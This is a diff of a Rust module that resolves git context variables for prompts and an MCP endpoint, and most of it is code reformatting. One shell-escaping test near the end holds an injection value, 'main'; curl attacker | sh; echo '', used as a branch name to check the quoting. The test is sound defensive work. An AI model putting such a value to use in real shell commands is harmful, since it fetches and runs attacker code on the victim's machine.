@@ -208,7 +208,8 @@ fn truncate(s: String, max: usize) -> String {
         return s;
     }
     // Find the last char boundary at or before `max` bytes
-    let end = s.char_indices()
+    let end = s
+        .char_indices()
         .take_while(|(i, _)| *i < max)
         .last()
         .map(|(i, c)| i + c.len_utf8())
@@ -227,7 +228,9 @@ fn parse_remote_owner_slug(url: &str) -> Option<(String, String)> {
         rest.split_once(':').map(|(_, p)| p)?
     } else {
         // https://github.com/owner/repo.git → /owner/repo.git (after host)
-        let without_scheme = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"))?;
+        let without_scheme = url
+            .strip_prefix("https://")
+            .or_else(|| url.strip_prefix("http://"))?;
         // Skip the host: github.com/owner/repo.git
         without_scheme.find('/').map(|i| &without_scheme[i + 1..])?
     };
@@ -235,12 +238,17 @@ fn parse_remote_owner_slug(url: &str) -> Option<(String, String)> {
     let mut parts = path.splitn(2, '/');
     let owner = parts.next()?.to_string();
     let slug = parts.next()?.to_string();
-    if owner.is_empty() || slug.is_empty() { return None; }
+    if owner.is_empty() || slug.is_empty() {
+        return None;
+    }
     Some((owner, slug))
 }
 
 fn detect_base_branch(repo_path: &str) -> Option<String> {
-    let output = git_output(repo_path, &["branch", "--list", "main", "master", "develop"])?;
+    let output = git_output(
+        repo_path,
+        &["branch", "--list", "main", "master", "develop"],
+    )?;
     // Each line is like "  main" or "* main"; pick first in priority order.
     let branches: Vec<String> = output
         .lines()
@@ -266,7 +274,8 @@ struct CacheEntry {
 }
 
 fn var_cache() -> &'static parking_lot::Mutex<HashMap<(String, String), CacheEntry>> {
-    static CACHE: OnceLock<parking_lot::Mutex<HashMap<(String, String), CacheEntry>>> = OnceLock::new();
+    static CACHE: OnceLock<parking_lot::Mutex<HashMap<(String, String), CacheEntry>>> =
+        OnceLock::new();
     CACHE.get_or_init(|| parking_lot::Mutex::new(HashMap::new()))
 }
 
@@ -274,7 +283,9 @@ fn resolve_single_var(repo_path: &str, var: &str) -> Option<String> {
     match var {
         "branch" => git_output(repo_path, &["rev-parse", "--abbrev-ref", "HEAD"]),
         "diff" => git_output(repo_path, &["diff"]).map(|v| truncate(v, MAX_VARIABLE_LEN)),
-        "staged_diff" => git_output(repo_path, &["diff", "--staged"]).map(|v| truncate(v, MAX_VARIABLE_LEN)),
+        "staged_diff" => {
+            git_output(repo_path, &["diff", "--staged"]).map(|v| truncate(v, MAX_VARIABLE_LEN))
+        }
         "changed_files" => git_output(repo_path, &["status", "--short"]),
         "commit_log" => git_output(repo_path, &["log", "--oneline", "-20"]),
         "last_commit" => git_output(repo_path, &["log", "-1", "--format=%H %s"]),
@@ -283,27 +294,40 @@ fn resolve_single_var(repo_path: &str, var: &str) -> Option<String> {
         "remote_url" => git_output(repo_path, &["config", "--get", "remote.origin.url"]),
         "current_user" => git_output(repo_path, &["config", "user.name"]),
         "base_branch" => detect_base_branch(repo_path),
-        "branch_status" => {
-            git_output(repo_path, &["rev-list", "--left-right", "--count", "@{upstream}...HEAD"])
-                .and_then(|s| {
-                    let parts: Vec<&str> = s.split_whitespace().collect();
-                    if parts.len() == 2 {
-                        Some(format!("{} ahead, {} behind", parts[1], parts[0]))
-                    } else {
-                        None
-                    }
-                })
-        }
+        "branch_status" => git_output(
+            repo_path,
+            &["rev-list", "--left-right", "--count", "@{upstream}...HEAD"],
+        )
+        .and_then(|s| {
+            let parts: Vec<&str> = s.split_whitespace().collect();
+            if parts.len() == 2 {
+                Some(format!("{} ahead, {} behind", parts[1], parts[0]))
+            } else {
+                None
+            }
+        }),
         _ => None,
     }
 }
 
 const ALL_VARS: &[&str] = &[
-    "branch", "diff", "staged_diff", "changed_files", "commit_log",
-    "last_commit", "conflict_files", "stash_list", "remote_url",
-    "current_user", "base_branch", "branch_status",
-    "dirty_files_count", "repo_owner", "repo_slug",
-    "repo_name", "repo_path",
+    "branch",
+    "diff",
+    "staged_diff",
+    "changed_files",
+    "commit_log",
+    "last_commit",
+    "conflict_files",
+    "stash_list",
+    "remote_url",
+    "current_user",
+    "base_branch",
+    "branch_status",
+    "dirty_files_count",
+    "repo_owner",
+    "repo_slug",
+    "repo_name",
+    "repo_path",
 ];
 
 fn resolve_vars(repo_path: &str, needed: &[String]) -> HashMap<String, String> {
@@ -316,16 +340,27 @@ fn resolve_vars(repo_path: &str, needed: &[String]) -> HashMap<String, String> {
         result.insert("repo_path".to_string(), repo_path.to_string());
     }
     if needed_set.contains("repo_name")
-        && let Some(name) = std::path::Path::new(repo_path).file_name().and_then(|n| n.to_str())
+        && let Some(name) = std::path::Path::new(repo_path)
+            .file_name()
+            .and_then(|n| n.to_str())
     {
         result.insert("repo_name".to_string(), name.to_string());
     }
 
     // Collect git vars we need, including implicit dependencies for derived vars.
     let directly_resolvable: &[&str] = &[
-        "branch", "diff", "staged_diff", "changed_files", "commit_log",
-        "last_commit", "conflict_files", "stash_list", "remote_url",
-        "current_user", "base_branch", "branch_status",
+        "branch",
+        "diff",
+        "staged_diff",
+        "changed_files",
+        "commit_log",
+        "last_commit",
+        "conflict_files",
+        "stash_list",
+        "remote_url",
+        "current_user",
+        "base_branch",
+        "branch_status",
     ];
     let mut git_needed: HashSet<&str> = HashSet::new();
     for var in directly_resolvable {
@@ -369,7 +404,10 @@ fn resolve_vars(repo_path: &str, needed: &[String]) -> HashMap<String, String> {
         for (name, value) in fresh {
             cache.insert(
                 (repo_path.to_string(), name.clone()),
-                CacheEntry { value: value.clone(), fetched_at: resolved_at },
+                CacheEntry {
+                    value: value.clone(),
+                    fetched_at: resolved_at,
+                },
             );
             result.insert(name, value);
         }
@@ -434,7 +472,9 @@ pub(crate) async fn resolve_prompt_variables(
 
 /// Resolve all git context variables (used by the MCP endpoint).
 #[cfg_attr(feature = "desktop", tauri::command)]
-pub(crate) async fn resolve_context_variables(repo_path: String) -> Result<HashMap<String, String>, String> {
+pub(crate) async fn resolve_context_variables(
+    repo_path: String,
+) -> Result<HashMap<String, String>, String> {
     tokio::task::spawn_blocking(move || {
         let all: Vec<String> = ALL_VARS.iter().map(|s| s.to_string()).collect();
         resolve_vars(&repo_path, &all)
@@ -577,9 +617,7 @@ mod tests {
     async fn resolve_context_variables_non_git_path() {
         let vars = resolve_context_variables("/tmp".to_string()).await.unwrap();
         // Should return empty or near-empty map, no panic
-        assert!(
-            vars.get("branch").is_none() || !vars.get("branch").unwrap().is_empty()
-        );
+        assert!(vars.get("branch").is_none() || !vars.get("branch").unwrap().is_empty());
     }
 
     // --- process_content_shell_safe tests ---
@@ -602,10 +640,7 @@ mod tests {
         // The emitted script wraps the value in single quotes using the
         // standard `'\''` dance for every embedded `'`.
         let mut vars = HashMap::new();
-        vars.insert(
-            "branch".into(),
-            "main'; curl attacker | sh; echo '".into(),
-        );
+        vars.insert("branch".into(), "main'; curl attacker | sh; echo '".into());
         let result = process_content_shell_safe("git checkout {branch}", &vars);
         assert_eq!(
             result,
